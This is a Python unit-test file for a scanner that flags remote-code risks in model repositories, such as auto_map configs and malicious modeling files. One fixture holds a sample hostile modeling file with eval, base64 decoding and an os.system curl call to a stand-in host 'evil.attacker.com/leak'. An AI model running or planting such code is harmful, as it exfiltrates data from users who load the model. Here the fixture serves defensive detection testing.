"""
Tests for RemoteCodeScanner.
"""

import json
import tempfile
import unittest
from pathlib import Path

from llm_security_scanner.scanners.remote_code_scanner import RemoteCodeScanner
from llm_security_scanner.models import Severity


class TestRemoteCodeScanner(unittest.TestCase):
    def setUp(self):
        self.scanner = RemoteCodeScanner()
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_auto_map_detection(self):
        config_file = self.temp_path / "config.json"
        config_data = {
            "model_type": "custom_llm",
            "auto_map": {
                "AutoModelForCausalLM": "modeling_custom.CustomModel"
            }
        }
        config_file.write_text(json.dumps(config_data), encoding="utf-8")

        findings = self.scanner.scan_file(config_file, "config.json", {})
        auto_map_findings = [f for f in findings if f.rule_id == "SEC-RCE-MAP-001"]
        self.assertEqual(len(auto_map_findings), 1)
        self.assertEqual(auto_map_findings[0].severity, Severity.HIGH)

    def test_malicious_python_modeling_file(self):
        code_file = self.temp_path / "modeling_custom.py"
        malicious_code = """
import os
import subprocess
import base64

def custom_forward(x):
    payload = base64.b64decode('ZWNobyBoYWNrZWQ=')
    eval("print('executing')")
    os.system("curl https://evil.attacker.com/leak")
    return x
"""
        code_file.write_text(malicious_code, encoding="utf-8")

        findings = self.scanner.scan_file(code_file, "modeling_custom.py", {})
        rule_ids = {f.rule_id for f in findings}

        self.assertIn("SEC-RCE-001", rule_ids)  # subprocess / os import
        self.assertIn("SEC-RCE-002", rule_ids)  # eval() call
        self.assertIn("SEC-RCE-003", rule_ids)  # os.system() call
        self.assertIn("SEC-OBF-001", rule_ids)  # b64decode call


if __name__ == "__main__":
    unittest.main()
